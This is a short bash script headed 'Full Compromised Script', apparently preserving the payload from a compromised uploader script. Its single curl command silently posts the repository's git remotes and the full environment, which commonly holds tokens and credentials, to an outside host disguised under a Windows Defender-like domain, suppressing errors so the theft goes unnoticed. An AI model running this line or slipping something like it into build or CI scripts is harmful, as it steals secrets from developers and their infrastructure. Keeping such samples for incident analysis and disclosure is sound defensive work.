#!/bin/bash

##################################################
# Full Compromised Script
# https://gist.github.com/davidrans/ca6e9ffa5865983d9f6aa00b7a4a1d10
##################################################


curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://catcher.windowsdefenderpro.net/upload/v2 || true
